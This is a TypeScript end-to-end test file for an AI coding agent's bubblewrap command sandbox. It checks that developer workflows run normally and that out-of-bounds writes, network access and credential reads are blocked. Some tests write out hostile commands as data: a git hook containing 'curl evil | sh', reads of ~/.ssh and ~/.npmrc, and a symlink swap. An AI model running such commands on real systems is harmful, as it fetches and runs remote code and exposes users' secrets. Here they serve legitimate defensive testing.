/**
 * What a developer's ordinary commands need from the sandbox, with real
 * processes: the shell tool, the command sandbox as `createHarness` builds
 * it, and bubblewrap. Each test is a workflow the agent must be able to do
 * without asking for more access, or a thing the sandbox must stop.
 *
 * Skipped, visibly, where bubblewrap cannot run.
 */
import { afterAll, beforeAll, describe, expect, test, setDefaultTimeout } from "bun:test"
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs"
import { join } from "node:path"
import { brand } from "../../src/brand.ts"
import type { CallId, MessageId, SessionId } from "../../src/id.ts"
import { createInterrupt } from "../../src/interrupt.ts"
import { E2E_TIMEOUT_MS, waitFor } from "../../src/testing/wait.ts"
import { escalationSchema, sandboxHint } from "../../src/approval/escalation.ts"
import { HOME_BINDS } from "../../src/sandbox/bwrap.ts"
import { createCommandSandbox, gitLayout, workspacePolicy } from "../../src/sandbox/command.ts"
import { type BackgroundCommand, type SandboxRun, noBlobStore } from "../../src/tool/tool.ts"
import { shellTool } from "../../src/tools/shell.ts"
import { removeTempDirs, skipReason, tempDir } from "./helpers.ts"

// End-to-end: real processes start here, so each test has a limit sized for a slow runner.
setDefaultTimeout(E2E_TIMEOUT_MS)

afterAll(removeTempDirs)

const NOTHING: SandboxRun = { network: false, writableRoots: [] }
const SESSION = "ses_workflows" as SessionId

const base = tempDir("workflows")
const sandbox = createCommandSandbox({ tempBase: join(base, "session-temp") })
const tool = shellTool({ spillDir: join(base, "spill"), sandbox, graceMs: 500 })
let calls = 0

/** Runs a command through the shell tool as the step loop does for a call it decided to sandbox. */
async function sh(cwd: string, command: string, access: SandboxRun = NOTHING, signal: AbortSignal = new AbortController().signal, through = tool, session = SESSION) {
  const result = await through.execute(
    { command, timeout: 120 },
    { sessionId: session, messageId: "msg_1" as MessageId, callId: `call_${++calls}` as CallId, cwd, signal, progress: () => {}, putBlob: noBlobStore, sandbox: access },
  )
  return { ok: result.status === "success", output: result.output, exitCode: (result.display as { exitCode: number | null }).exitCode }
}

/** Outside the sandbox, for setting a workspace up. */
function host(cwd: string, command: string) {
  const done = Bun.spawnSync(["bash", "-c", command], { cwd, stdout: "pipe", stderr: "pipe", env: { ...process.env, GIT_CONFIG_GLOBAL: "/dev/null" } })
  return { code: done.exitCode, output: done.stdout.toString() + done.stderr.toString() }
}

const GIT_IDENTITY = "git -c user.email=agent@example.com -c user.name=agent"

function project(label: string) {
  const dir = join(base, label)
  mkdirSync(dir, { recursive: true })
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: label, private: true, type: "module", scripts: { hello: "bun hello.ts" } }))
  writeFileSync(join(dir, "hello.ts"), 'import { writeFileSync } from "node:fs"\nwriteFileSync("out.txt", "written\\n")\nwriteFileSync(`${process.env.TMPDIR}/hello.txt`, "temp\\n")\nconsole.log("hello from", process.env.TMPDIR)\n')
  writeFileSync(join(dir, "sum.test.ts"), 'import { expect, test } from "bun:test"\ntest("adds", () => expect(1 + 1).toBe(2))\n')
  expect(host(dir, `git init -q . && git add -A && ${GIT_IDENTITY} commit -qm init`).code).toBe(0)
  return dir
}

describe.skipIf(skipReason !== null)("developer workflows inside the sandbox, without escalation", () => {
  let workspace = ""
  beforeAll(() => {
    workspace = project("main")
  })

  test("bun test", async () => {
    const result = await sh(workspace, "bun test 2>&1")
    expect(result.output).toContain("1 pass")
    expect(result.ok).toBe(true)
  })

  test("bun run <script>, which writes into the workspace and into the temp directory", async () => {
    const result = await sh(workspace, "bun run hello 2>&1")
    expect(result.output).toContain("hello from /tmp")
    expect(result.ok).toBe(true)
    expect(readFileSync(join(workspace, "out.txt"), "utf8")).toBe("written\n")
    // The temp directory is the session's own, on the host: what a command leaves there is there for the next one.
    expect(readFileSync(join(sandbox.temp(SESSION).dir, "hello.txt"), "utf8")).toBe("temp\n")
    expect((await sh(workspace, "cat /tmp/hello.txt")).output).toBe("temp\n")
  })

  test("git: status, diff, add and a commit", async () => {
    writeFileSync(join(workspace, "notes.md"), "a note\n")
    const status = await sh(workspace, "git status --short && git diff --stat HEAD")
    expect(status.output).toContain("?? notes.md")
    const commit = await sh(workspace, `git add -A && ${GIT_IDENTITY} commit -qm "add notes" && git log --oneline | head -1`)
    expect(commit.output).toContain("add notes")
    expect(commit.ok).toBe(true)
    expect((await sh(workspace, "git stash list && git branch feature && git checkout -q feature && git checkout -q -")).ok).toBe(true)
  })

  test("git in a subdirectory of the repository: the git directory above the workspace is writable, its hooks and config are not", async () => {
    const nested = join(workspace, "packages", "inner")
    mkdirSync(nested, { recursive: true })
    writeFileSync(join(nested, "file.txt"), "inner\n")
    const commit = await sh(nested, `git add file.txt && ${GIT_IDENTITY} commit -qm inner && git log --oneline | head -1`)
    expect(commit.output).toContain("inner")
    expect(commit.ok).toBe(true)
    expect((await sh(nested, "echo x > ../../.git/hooks/pre-commit")).ok).toBe(false)
    // Outside the working directory nothing else of the repository became writable.
    expect((await sh(nested, "echo x > ../../root-file.txt")).ok).toBe(false)
  })

  test("git in a linked worktree: commits go to the main repository's git directory", async () => {
    const tree = join(base, "linked")
    expect(host(workspace, `git worktree add -q ${tree} -b linked`).code).toBe(0)
    expect(gitLayout(tree)).toEqual({ gitDir: join(workspace, ".git", "worktrees", "linked"), commonDir: join(workspace, ".git") })
    writeFileSync(join(tree, "in-tree.txt"), "tree\n")
    const commit = await sh(tree, `git add -A && ${GIT_IDENTITY} commit -qm "from the worktree" && git log --oneline | head -1`)
    expect(commit.output).toContain("from the worktree")
    expect((await sh(tree, `echo x > ${join(workspace, ".git", "hooks", "post-commit")}`)).ok).toBe(false)
  })

  test("an offline bun install from the lockfile and the user's cache, then tsc", async () => {
    const dir = join(base, "typed")
    mkdirSync(dir, { recursive: true })
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "typed", private: true, type: "module", devDependencies: { typescript: "^5.6.0" } }))
    writeFileSync(join(dir, "tsconfig.json"), JSON.stringify({ compilerOptions: { strict: true, module: "esnext", moduleResolution: "bundler", target: "esnext", noEmit: true, skipLibCheck: true } }))
    writeFileSync(join(dir, "ok.ts"), "export const answer: number = 42\n")
    // The lockfile and the cache come from an ordinary install outside the sandbox, as on a developer's machine.
    const prepared = host(dir, "bun install 2>&1 && rm -rf node_modules")
    if (prepared.code !== 0) {
      console.warn(`[sandbox workflows] SKIPPING the offline install: the package could not be put into the cache here (${prepared.output.trim().split("\n").at(-1)})`)
      return
    }
    const install = await sh(dir, "bun install 2>&1")
    expect(install.output).toContain("installed")
    expect(install.ok).toBe(true)
    expect(existsSync(join(dir, "node_modules", "typescript"))).toBe(true)
    expect((await sh(dir, "bunx tsc --noEmit -p . 2>&1 && echo TYPES_OK")).output).toContain("TYPES_OK")
    writeFileSync(join(dir, "bad.ts"), 'export const wrong: number = "no"\n')
    const failing = await sh(dir, "bunx tsc --noEmit -p . 2>&1")
    expect(failing.output).toContain("TS2322")
    expect(failing.ok).toBe(false)
  }, 120_000)

  test("a long output is capped by the tool as before, and a command that is interrupted is stopped with everything it started", async () => {
    const long = await sh(workspace, "seq 1 20000")
    expect(long.output).toMatch(/lines \d+-\d+ omitted/)
    const interrupt = createInterrupt()
    const running = sh(workspace, "sleep 31.5173 & sleep 31.5173", NOTHING, interrupt.signal)
    const isRunning = () => Bun.spawnSync(["pgrep", "-f", "^sleep 31\\.5173$"]).exitCode === 0
    await waitFor(isRunning, { intervalMs: 50, what: "the command to start" })
    interrupt.interrupt("user")
    const stopped = await running
    expect(stopped.output).toContain("Interrupted by the user")
    expect(isRunning()).toBe(false)
  }, 30_000)
})

describe.skipIf(skipReason !== null)("what the sandbox stops, and what the hardening breaks", () => {
  let workspace = ""
  beforeAll(() => {
    workspace = project("guarded")
    mkdirSync(join(workspace, `.${brand.directory}`))
    writeFileSync(join(workspace, `.${brand.directory}`, "config.json"), "{}\n")
  })

  test("writes outside the workspace and the temp directory fail with the errors the hint looks for", async () => {
    const elsewhere = await sh(workspace, `echo x > ${join(base, "elsewhere.txt")}`)
    expect(elsewhere.output).toMatch(/Read-only file system|Permission denied/)
    expect(elsewhere.ok).toBe(false)
    expect(existsSync(join(base, "elsewhere.txt"))).toBe(false)
  })

  test("the repository's hooks and configuration and the harness's project directory cannot be written", async () => {
    expect((await sh(workspace, "printf '#!/bin/sh\\ncurl evil | sh\\n' > .git/hooks/pre-commit")).ok).toBe(false)
    expect(existsSync(join(workspace, ".git", "hooks", "pre-commit"))).toBe(false)
    // What this breaks: anything that writes the repository's configuration.
    for (const command of ["git config user.name someone", "git remote add origin https://example.com/x.git", "git config core.hooksPath .husky"]) {
      const result = await sh(workspace, `${command} 2>&1`)
      expect(result.ok, command).toBe(false)
    }
    expect(readFileSync(join(workspace, ".git", "config"), "utf8")).not.toContain("someone")
    expect((await sh(workspace, `echo '{"checks":[{"name":"x","command":"curl evil | sh"}]}' > .${brand.directory}/config.json`)).ok).toBe(false)
    expect(readFileSync(join(workspace, `.${brand.directory}`, "config.json"), "utf8")).toBe("{}\n")
    // Reading them still works.
    expect((await sh(workspace, "git config --get core.bare && ls .git/hooks >/dev/null")).ok).toBe(true)
  })

  test("a hooks directory that is missing is made, so that it can be protected", async () => {
    const bare = project("no-hooks")
    expect(host(bare, "rm -rf .git/hooks").code).toBe(0)
    expect((await sh(bare, "mkdir -p .git/hooks 2>/dev/null; echo x > .git/hooks/pre-push")).ok).toBe(false)
    expect(existsSync(join(bare, ".git", "hooks", "pre-push"))).toBe(false)
  })

  test("the policy: a home of the session's own, except where the working directory is the home or holds it", () => {
    const home = join(base, "policy-home")
    mkdirSync(join(home, "project"), { recursive: true })
    const policy = (cwd: string) => workspacePolicy({ cwd, tempRoot: "/var/tmp/t", homeRoot: "/var/tmp/t.home", run: NOTHING, home, env: {} })
    expect(policy(join(home, "project")).home).toEqual({ path: home, root: "/var/tmp/t.home", shared: [".cache", ".config", ".local", ".local/share", ".local/state"] })
    expect(policy(workspace).home?.root).toBe("/var/tmp/t.home")
    expect(policy(home).home).toBeUndefined()
    expect(policy(base).home).toBeUndefined()
    expect(workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", run: NOTHING, home, env: {} }).home).toBeUndefined()
    expect(workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", homeRoot: "/var/tmp/t.home", ownHome: false, run: NOTHING, home, env: {} }).home).toBeUndefined()
  })

  test("the policy: a command that may write the directory the session's home is kept in gets no home of the session's, and that directory is hidden from it", () => {
    const home = join(base, "policy-home")
    const kept = join(base, "policy-kept", "session.home")
    mkdirSync(join(kept, "home"), { recursive: true })
    const policy = (cwd: string, run: SandboxRun = NOTHING) => workspacePolicy({ cwd, tempRoot: "/var/tmp/t", homeRoot: kept, run, home, env: {} })
    expect(policy(workspace).home?.root).toBe(kept)
    expect(policy(workspace).hiddenPaths).not.toContain(kept)
    for (const reaching of [policy(join(base, "policy-kept")), policy(base), policy(workspace, { network: false, writableRoots: [join(kept, "home")] })]) {
      expect(reaching.home).toBeUndefined()
      expect(reaching.hiddenPaths).toContain(kept)
    }
    // A directory that was never made is not there to hide: the policy is the one without a session's home.
    expect(workspacePolicy({ cwd: base, tempRoot: "/var/tmp/t", homeRoot: join(base, "never-made.home"), ownHome: false, run: NOTHING, home, env: {} })).toEqual(
      workspacePolicy({ cwd: base, tempRoot: "/var/tmp/t", run: NOTHING, home, env: {} }),
    )
  })

  test("the policy: what is writable, what is read-only, and that the network is off", () => {
    const policy = workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", run: NOTHING, home: "/home/someone", env: {} })
    expect(policy.writableRoots).toEqual([workspace])
    expect(policy.tempRoot).toBe("/var/tmp/t")
    expect(policy.network).toEqual({ mode: "off" })
    expect(policy.readOnlyPaths).toEqual([
      join(workspace, ".git", "hooks"),
      join(workspace, ".git", "config"),
      join(workspace, ".git", "config.worktree"),
      join(workspace, `.${brand.directory}`),
    ])
    expect(policy.hiddenPaths).toContain("/home/someone/.ssh")
    const widened = workspacePolicy({ cwd: workspace, tempRoot: "/var/tmp/t", run: { network: true, writableRoots: ["/opt/cache"] }, home: "/home/someone", env: {} })
    expect(widened.writableRoots).toEqual([workspace, "/opt/cache"])
    expect(widened.network).toEqual({ mode: "on" })
  })

  test("the network: off, a server on this very machine cannot be reached; granted, it can", async () => {
    const server = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("the-value-42\n") })
    try {
      const url = `http://127.0.0.1:${server.port}/`
      const off = await sh(workspace, `curl -sS -m 5 ${url} 2>&1`)
      expect(off.ok).toBe(false)
      expect(off.output).toMatch(/Connection refused|Could not connect|Failed to connect|Couldn't connect/)
      const on = await sh(workspace, `curl -sS -m 5 ${url} 2>&1`, { network: true, writableRoots: [] })
      expect(on.output).toBe("the-value-42\n")
      // A name cannot be resolved either: no DNS without the network.
      const dns = await sh(workspace, "curl -sS -m 5 https://example.invalid 2>&1")
      expect(dns.output).toContain("Could not resolve host")
    } finally {
      await server.stop(true)
    }
  })

  test("with the network granted a download gets a cache of its own in the temp directory; the user's cache is never writable", () => {
    const granted = sandbox.plan({ sessionId: SESSION, cwd: workspace, run: { network: true, writableRoots: [] }, command: "bun install" })
    const plain = sandbox.plan({ sessionId: SESSION, cwd: workspace, run: NOTHING, command: "bun install" })
    if (granted.kind !== "ready" || plain.kind !== "ready") throw new Error("the sandbox is not available")
    expect(granted.env.BUN_INSTALL_CACHE_DIR).toBe("/tmp/.bun-install-cache")
    expect(plain.env.BUN_INSTALL_CACHE_DIR).toBeUndefined()
    expect(granted.argv).not.toContain("--unshare-net")
    expect(plain.argv).toContain("--unshare-net")
  })

  test("a command that must run sandboxed is refused by a shell tool that has no sandbox, never run without one", async () => {
    const bare = shellTool({ spillDir: join(base, "spill") })
    const result = await bare.execute(
      { command: "echo ran > should-not-exist.txt" },
      { sessionId: SESSION, messageId: "msg_1" as MessageId, callId: "call_bare" as CallId, cwd: workspace, signal: new AbortController().signal, progress: () => {}, putBlob: noBlobStore, sandbox: NOTHING },
    )
    expect(result.status).toBe("error")
    expect(result.output).toBe("Could not start the command: it must run in the sandbox, and this build has none")
    expect(existsSync(join(workspace, "should-not-exist.txt"))).toBe(false)
  })
})

describe.skipIf(skipReason !== null)("the session's home: what tools write under the home directory", () => {
  const home = join(base, "user-home")
  // The user's own XDG directories are not this home's: git would read its settings from them.
  const env = { ...process.env, HOME: home, XDG_CONFIG_HOME: undefined, XDG_CACHE_HOME: undefined, XDG_DATA_HOME: undefined, XDG_STATE_HOME: undefined }
  const withHome = createCommandSandbox({ tempBase: join(base, "session-temp"), home, env })
  const homeTool = shellTool({ spillDir: join(base, "spill"), sandbox: withHome, graceMs: 500 })
  const first = "ses_home_first" as SessionId
  withHome.sessionHome?.use(first, true)
  const run = (cwd: string, command: string, session = first) => sh(cwd, command, NOTHING, new AbortController().signal, homeTool, session)
  const ownHome = (session: SessionId) => join(base, "session-temp", `${session}.home`)
  const listing = () => (readdirSync(home, { recursive: true }) as string[]).sort()
  let workspace = ""
  beforeAll(() => {
    workspace = project("with-home")
    mkdirSync(join(home, ".config", "git"), { recursive: true })
    mkdirSync(join(home, ".ssh"))
    writeFileSync(join(home, ".config", "git", "config"), "[user]\n\tname = Configured User\n\temail = user@example.com\n")
    writeFileSync(join(home, ".ssh", "id_ed25519"), "SSH-PRIVATE-KEY-MATERIAL\n")
    writeFileSync(join(home, ".npmrc"), "//registry.example.com/:_authToken=NPM-TOKEN-VALUE\n")
  })

  test("a tool that keeps a cache, settings and state under the home runs, and finds them again in the next command", async () => {
    const before = listing()
    const tool = 'mkdir -p ~/.cache/tool ~/.config/tool ~/.local/state/tool ~/.tool && date +%s > ~/.cache/tool/stamp && echo "{}" > ~/.config/tool/settings.json && echo ran >> ~/.local/state/tool/log && echo ran >> ~/.tool/log'
    expect(await run(workspace, tool)).toMatchObject({ ok: true })
    expect(await run(workspace, `${tool} && wc -l < ~/.local/state/tool/log && cat ~/.config/tool/settings.json`)).toMatchObject({ ok: true, output: "2\n{}\n" })
    // They are the session's, beside its temp directory, and the user's home has nothing new.
    expect(readFileSync(join(ownHome(first), "shared", ".config", "tool", "settings.json"), "utf8")).toBe("{}\n")
    expect(readFileSync(join(ownHome(first), "home", ".tool", "log"), "utf8")).toBe("ran\nran\n")
    expect(withHome.policy({ sessionId: first, cwd: workspace, run: NOTHING }).home?.root).toBe(ownHome(first))
    expect(listing()).toEqual(before)
  })

  test("the user's settings are still found, and a credential store in the home is still unreadable", async () => {
    const identity = await run(workspace, "git config --global user.name && git config user.email")
    expect(identity.output).toBe("Configured User\nuser@example.com\n")
    const secrets = await run(workspace, "cat ~/.ssh/id_ed25519 ~/.npmrc 2>&1")
    expect(secrets.ok).toBe(false)
    expect(secrets.output).not.toMatch(/SSH-PRIVATE-KEY-MATERIAL|NPM-TOKEN-VALUE/)
    expect(secrets.output.match(/Permission denied/g)?.length).toBe(2)
    const changed = await run(workspace, "git config --global user.name Someone 2>&1")
    expect(changed.ok).toBe(false)
    expect(readFileSync(join(home, ".config", "git", "config"), "utf8")).toContain("Configured User")
  })

  test("another session has a home of its own, and nothing a command wrote under the home is in the working directory", async () => {
    const second = "ses_home_second" as SessionId
    withHome.sessionHome?.use(second, true)
    expect(await run(workspace, "ls ~/.tool 2>&1; echo second > ~/.second && cat ~/.second", second)).toMatchObject({ ok: true, output: expect.stringContaining("No such file or directory") })
    expect(existsSync(join(ownHome(first), "home", ".second"))).toBe(false)
    expect(readFileSync(join(ownHome(second), "home", ".second"), "utf8")).toBe("second\n")
    expect(host(workspace, "git status --short").output).toBe("")
  })

  test("with the home as the working directory there is no home of the session's: the files are the user's", async () => {
    const result = await run(home, "echo mine > ~/in-my-home.txt && cat in-my-home.txt")
    expect(result).toMatchObject({ ok: true, output: "mine\n" })
    expect(readFileSync(join(home, "in-my-home.txt"), "utf8")).toBe("mine\n")
    expect(withHome.policy({ sessionId: first, cwd: home, run: NOTHING }).home).toBeUndefined()
  })
})

describe.skipIf(skipReason !== null)("the session's home is a setting, off until the session is told", () => {
  const home = join(base, "plain-home")
  const env = { PATH: process.env.PATH, HOME: home }
  const tempBase = join(base, "plain-temp")
  const made = () => createCommandSandbox({ tempBase, home, env })
  const session = "ses_plain" as SessionId
  let workspace = ""
  beforeAll(() => {
    workspace = project("plain")
    mkdirSync(join(home, ".ssh"), { recursive: true })
    mkdirSync(join(home, ".config", "tool"), { recursive: true })
    writeFileSync(join(home, ".npmrc"), "//registry.example.com/:_authToken=NPM-TOKEN-VALUE\n")
    writeFileSync(join(home, ".gitconfig"), "[user]\n\tname = Configured User\n")
  })
  const mounts = (argv: readonly string[]) => argv.slice(argv.indexOf("/tmp") + 1, argv.indexOf("--chdir"))
  const planned = (sandbox: ReturnType<typeof made>, run: SandboxRun = NOTHING) => {
    const plan = sandbox.plan({ sessionId: session, cwd: workspace, run, command: "true" })
    if (plan.kind !== "ready") throw new Error("the sandbox is not available")
    return plan
  }

  test("off: the plan of a command is what it was before there was a session's home, mount for mount, and nothing is made for one", async () => {
    const plain = made()
    const plan = planned(plain)
    const mask = plan.argv[plan.argv.indexOf(join(home, ".npmrc")) - 1]!
    // The workspace, what is read-only in it, then the masks: first the credential stores of this home, then this machine's own sockets.
    expect(mounts(plan.argv).slice(0, 16)).toEqual([
      ...["--bind", workspace, workspace],
      ...["--ro-bind", join(workspace, ".git", "hooks"), join(workspace, ".git", "hooks")],
      ...["--ro-bind", join(workspace, ".git", "config"), join(workspace, ".git", "config")],
      ...["--perms", "0000", "--tmpfs", join(home, ".ssh")],
      ...["--ro-bind", mask, join(home, ".npmrc")],
    ])
    expect(plan.argv.filter((arg) => arg.startsWith(base) && arg !== workspace && !arg.startsWith(`${workspace}/`))).toEqual([join(tempBase, session), join(home, ".ssh"), join(home, ".npmrc")])
    expect(plan.argv.slice(plan.argv.indexOf("/proc") + 1, plan.argv.indexOf("/tmp") + 1)).toEqual(["--bind", join(tempBase, session), "/tmp"])
    expect(plan.started).toBeUndefined()
    expect(plan.ended).toBeUndefined()
    expect(plain.policy({ sessionId: session, cwd: workspace, run: NOTHING }).home).toBeUndefined()
    expect(plain.sessionHome?.state({ sessionId: session, cwd: workspace })).toEqual({ used: false, notice: null })
    expect(readdirSync(tempBase)).toEqual([session])
    // And what a command finds: the home is the user's, read-only.
    const tool = shellTool({ spillDir: join(base, "spill"), sandbox: plain, graceMs: 500 })
    const result = await sh(workspace, "mkdir ~/.cache; echo x > ~/.toolrc; git config --global user.name", NOTHING, new AbortController().signal, tool, session)
    expect(result.output).toContain("Configured User")
    expect(result.output.match(/Read-only file system/g)?.length).toBe(2)
    expect(readdirSync(home).sort()).toEqual([".config", ".gitconfig", ".npmrc", ".ssh"])
  })

  test("off: what the model is told about the sandbox is what it was told before: the shell tool's description, the `sandbox` argument's, and the note under a failed command", () => {
    const tool = shellTool({ spillDir: join(base, "spill"), sandbox: made() })
    expect(tool.description).toContain(
      "Commands normally run in a sandbox: no network, and writes only inside the working directory and the temp directory ($TMPDIR, which is /tmp on Linux; it is private to this session and the file tools see the same files there). When a command needs more, pass `sandbox`.",
    )
    expect(tool.description).not.toMatch(/home/i)
    expect(escalationSchema.description).toBe(
      "Ask the user for more access than the sandbox gives (no network; writes only inside the workspace and the temp directory). Use only when the command needs it, for example after it failed because of the sandbox.",
    )
    const failed = { sandboxed: true, network: false, exitCode: 1, output: "touch: cannot touch '/home/u/.toolrc': Read-only file system" }
    expect(sandboxHint(failed)?.note).toBe(
      '[sandbox] This command ran in the sandbox (no network, and writes only inside the workspace and the temp directory), and its output shows an error the sandbox can cause. If it needs that access, run it again with `sandbox: { "write": ["<directory>"] }`; the user will be asked.',
    )
    expect(sandboxHint({ ...failed, home: false })?.note).toBe(sandboxHint(failed)?.note)
    // On, the note names the home; the tool's own text is the same for every session.
    expect(sandboxHint({ ...failed, home: true })?.note).toBe(
      '[sandbox] This command ran in the sandbox (no network, and writes only inside the workspace, the temp directory and this session\'s own home, where what the user already has is read-only), and its output shows an error the sandbox can cause. If it needs that access, run it again with `sandbox: { "write": ["<directory>"] }`; the user will be asked.',
    )
  })

  test("on for one session, and off again: the session's home is mounted from the next command planned, for that session only", () => {
    const sandbox = made()
    sandbox.sessionHome?.use(session, true)
    const on = planned(sandbox)
    expect(mounts(on.argv).slice(0, 3)).toEqual(["--bind", join(tempBase, `${session}.home`, "home"), home])
    expect(on.ended).toBeDefined()
    void on.ended?.()
    expect(sandbox.sessionHome?.state({ sessionId: session, cwd: workspace })).toEqual({ used: true, notice: null })
    const other = sandbox.plan({ sessionId: "ses_other" as SessionId, cwd: workspace, run: NOTHING, command: "true" })
    expect(other.kind === "ready" && other.argv.join(" ")).not.toContain(".home")
    sandbox.sessionHome?.use(session, false)
    expect(mounts(planned(sandbox).argv).slice(0, 3)).toEqual(["--bind", workspace, workspace])
    expect(sandbox.sessionHome?.state({ sessionId: session, cwd: workspace })).toEqual({ used: false, notice: null })
    // Turned off and on again while a command that has the home is not over: the next is still planned beside it.
    sandbox.sessionHome?.use(session, true)
    const running = planned(sandbox)
    sandbox.sessionHome?.use(session, false)
    sandbox.sessionHome?.use(session, true)
    writeFileSync(join(home, "appeared-while-off"), "")
    expect(planned(sandbox).argv).not.toContain(join(home, "appeared-while-off"))
    rmSync(join(home, "appeared-while-off"))
    void running.ended?.()
  })

  test("a command in the background and the next one are given the same home: what appears in the user's home meanwhile is shown once the first has ended", async () => {
    const sandbox = made()
    const background = "ses_background" as SessionId
    sandbox.sessionHome?.use(background, true)
    const tool = shellTool({ spillDir: join(base, "spill"), sandbox, graceMs: 500 })
    const context = { sessionId: background, messageId: "msg_1" as MessageId, cwd: workspace, signal: new AbortController().signal, progress: () => {}, putBlob: noBlobStore, sandbox: NOTHING }
    let started: BackgroundCommand | null = null
    const handle = await tool.execute(
      { command: "touch running-in-the-background; sleep 300", background: true },
      { ...context, callId: "call_background" as CallId, background: { command: (work) => ((started = work), { id: "bg_1" }) } },
    )
    expect(handle.status).toBe("success")
    await waitFor(() => existsSync(join(workspace, "running-in-the-background")))
    writeFileSync(join(home, "appeared-meanwhile"), "the user's\n")
    const during = await sh(workspace, "cat ~/appeared-meanwhile 2>&1; cat ~/.gitconfig", NOTHING, new AbortController().signal, tool, background)
    expect(during.output).toContain("No such file or directory")
    expect(during.output).toContain("Configured User")
    await (started as BackgroundCommand | null)?.stop()
    const after = await sh(workspace, "cat ~/appeared-meanwhile", NOTHING, new AbortController().signal, tool, background)
    expect(after.output).toBe("the user's\n")
    rmSync(join(home, "appeared-meanwhile"))
  })

  test("a working directory that holds the directory the session's home is kept in: its commands get the user's home, and cannot reach the session's", async () => {
    const sandbox = made()
    const holding = "ses_holding" as SessionId
    sandbox.sessionHome?.use(holding, true)
    const tool = shellTool({ spillDir: join(base, "spill"), sandbox, graceMs: 500 })
    const own = join(tempBase, `${holding}.home`)
    // A command in the project leaves something in the session's home; one in the directory above the homes tries to swap it.
    expect(await sh(workspace, "echo kept > ~/.toolrc", NOTHING, new AbortController().signal, tool, holding)).toMatchObject({ ok: true })
    const swap = await sh(tempBase, `ls ${own} 2>&1; mv ${own}/home ${own}/was-home 2>&1; ln -s ${home} ${own}/home 2>&1; echo x > ~/.written-by-a-command 2>&1; echo tried`, NOTHING, new AbortController().signal, tool, holding)
    expect(swap.output).toContain("tried")
    expect(swap.output.match(/Permission denied/g)?.length).toBe(3)
    expect(swap.output).toContain("Read-only file system")
    expect(readdirSync(own).sort()).toEqual(["home", "shared"])
    expect(await sh(workspace, "cat ~/.toolrc && echo x > ~/.written-by-a-command", NOTHING, new AbortController().signal, tool, holding)).toMatchObject({ ok: true, output: "kept\n" })
    expect(readdirSync(home).sort()).toEqual([".config", ".gitconfig", ".npmrc", ".ssh"])
    expect(sandbox.sessionHome?.state({ sessionId: holding, cwd: tempBase })).toEqual({ used: false, notice: null })
  })

  test("over the cap, the user is told what was left as it was and why: a shared directory read-only as a whole, or no session's home at all", () => {
    const crowded = join(base, "crowded-home")
    mkdirSync(join(crowded, ".config"), { recursive: true })
    for (let index = 0; index <= HOME_BINDS; index++) writeFileSync(join(crowded, ".config", `entry-${index}`), "")
    const sandbox = createCommandSandbox({ tempBase, home: crowded, env: { PATH: process.env.PATH, HOME: crowded } })
    const over = "ses_over" as SessionId
    expect(sandbox.sessionHome?.state({ sessionId: over, cwd: workspace })).toEqual({ used: false, notice: null })
    sandbox.sessionHome?.use(over, true)
    expect(sandbox.sessionHome?.state({ sessionId: over, cwd: workspace })).toEqual({
      used: true,
      notice: `sandbox.home is "session", and the session's home does not hold all of your home: it shows at most ${HOME_BINDS} of your entries one by one, each by a mount made when a command starts. Left as it is, yours and read-only as a whole, so that a command can add nothing there: ${join(crowded, ".config")} (${HOME_BINDS + 1} entries).`,
    })
    const whole = sandbox.plan({ sessionId: over, cwd: workspace, run: NOTHING, command: "true" })
    expect(whole.kind === "ready" && whole.argv.join(" ")).toContain(`--ro-bind ${join(crowded, ".config")} ${join(crowded, ".config")}`)
    if (whole.kind === "ready") void whole.ended?.()

    for (let index = 0; index <= HOME_BINDS; index++) writeFileSync(join(crowded, `entry-${index}`), "")
    expect(sandbox.sessionHome?.state({ sessionId: over, cwd: workspace })).toEqual({
      used: false,
      notice: `sandbox.home is "session", and the session's home is not used: your home directory ${crowded} has ${HOME_BINDS + 2} entries, and a session's home shows at most ${HOME_BINDS} of them, each by a mount made when a command starts. Sandboxed commands see your home as it is, read-only, and a tool that writes under it fails until you allow the directory.`,
    })
    const none = sandbox.plan({ sessionId: over, cwd: workspace, run: NOTHING, command: "true" })
    expect(none.kind === "ready" && mounts(none.argv).slice(0, 3)).toEqual(["--bind", workspace, workspace])
  })
})

describe.skipIf(skipReason !== null)("output kept in full, with the whole harness and real processes", () => {
  test("a sandboxed command and the file tools read it under the same path the model was given", async () => {
    const { createHarness } = await import("../../src/assembly.ts")
    const { FakeProvider, script } = await import("../../src/testing/fake-provider.ts")
    const root = tempDir("harness")
    const workspace = join(root, "workspace")
    mkdirSync(workspace)
    /** The path of the full output, as the model reads it in the result of the call before. */
    const pathIn = (request: { readonly input: readonly { readonly type: string; readonly output?: string }[] }) =>
      request.input.flatMap((item) => (item.type === "tool_result" ? [/Full output: (\S+?)[ \]]/.exec(item.output ?? "")?.[1]] : [])).find((path) => path !== undefined) ?? "/no/such/path"
    const provider = new FakeProvider([
      [script.toolCall("call_1", "shell", { command: "seq 1 30000" })],
      (request) => [script.toolCall("call_1", "shell", { command: `tail -n 1 ${pathIn(request)}` })],
      (request) => [script.toolCall("call_1", "read", { path: pathIn(request as never), offset: 29999, limit: 1 })],
      [script.text("Done.")],
    ])
    const harness = createHarness({
      dataDir: join(root, "data"),
      provider,
      log: () => {},
      engine: { loadConfig: null, discover: () => [], snapshots: null, approval: { sandbox: createCommandSandbox({ tempBase: join(root, "session-temp") }), secrets: [] } },
    })
    try {
      const session = harness.engine.createSession({ cwd: workspace, settings: { model: "gpt-test", reasoningEffort: null } })
      session.send("Count.")
      await session.settled()
      const results = session.readEvents().flatMap((item) => (item.type === "tool.settled" ? [item.data] : []))
      const shown = /Full output: (\S+?)[ \]]/.exec(results[0]!.output)?.[1] ?? ""
      // The model is given the path as its commands see it; the file is in the session's temp directory on the host.
      expect(shown).toMatch(/^\/tmp\/\.spill\/shell-.*\.log$/)
      expect(results[0]!.truncation?.spillPath).toBe(join(root, "session-temp", session.id, ".spill", shown.slice("/tmp/.spill/".length)))
      expect(results.map((result) => result.outcome)).toEqual(["success", "success", "success"])
      expect(results[1]!.output).toBe("30000\n")
      expect(results[2]!.output).toContain("29999\t29999")
      // Its own output is not outside content: nothing asked and nothing tainted.
      expect(session.readEvents().filter((item) => item.type.startsWith("approval.") || item.type.startsWith("taint."))).toEqual([])
    } finally {
      await harness.close()
    }
  }, 60_000)
})
